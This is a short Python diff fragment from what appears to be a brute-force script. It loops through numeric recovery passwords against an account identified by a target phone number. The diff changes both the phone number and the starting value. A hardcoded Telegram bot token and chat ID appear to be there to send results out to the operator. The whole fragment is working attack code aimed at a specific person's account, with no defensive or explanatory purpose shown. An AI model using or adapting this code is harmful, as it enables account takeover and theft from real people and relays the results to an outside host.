@@ -5,11 +5,11 @@ headers = {"Content-Type": "application/json"}
 TOKEN = "9252397028:AAE4kzmZYeIKJuWVdeRiy7Ai5KocsT4xWro"
 CHAT_ID = 6263683593
 url2 = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-target_phone = "772490746"
+target_phone = "772144841"
 
 for i in range(9999999):
     time.sleep(0.2)
-    zee = 4456190
+    zee = 1000000
     
     data = {
         "username": target_phone,"recoveryPassword": str(zee + i)
